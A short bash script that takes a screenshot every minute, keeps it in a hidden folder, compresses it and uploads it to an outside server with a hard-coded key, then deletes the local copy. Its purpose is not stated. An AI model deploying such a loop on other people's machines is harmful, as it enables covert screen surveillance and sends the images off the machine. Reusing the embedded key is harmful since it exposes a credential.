#!/bin/bash
uploadserver=https://upload.nizu.io/
myuser=$(whoami)
user=1
key=zFaZdHVYiseUsRgmqnm9MerIPBC4T1Re
curlfile="files[]=@/home/$myuser/.screenshots-bg/"
mkdir -p ~/.screenshots-bg
#import -window root ~/.screenshots-bg/$pngfile
while true; do
	pngfile=$(date +"%Y-%m-%d-%H-%M").png
	webfile=$(date +"%Y-%m-%d-%H-%M").webp
	curlf="curl -F '${curlfile}${webfile}' -F 'key=${key}' ${uploadserver}"
	scrot -z -u '%Y-%m-%d-%H-%M.png' -e 'mv $f ~/.screenshots-bg/'
	convert ~/.screenshots-bg/$pngfile -quality 30% ~/.screenshots-bg/$webfile
	rm ~/.screenshots-bg/$pngfile
	eval $curlf
	#echo $curlf | /bin/bash
	rm ~/.screenshots-bg/$webfile
	echo "___"
	echo "$myuser upload file $webfile to $uploadserver using command"
	echo "$curlf"
	echo ""
	sleep 60
done
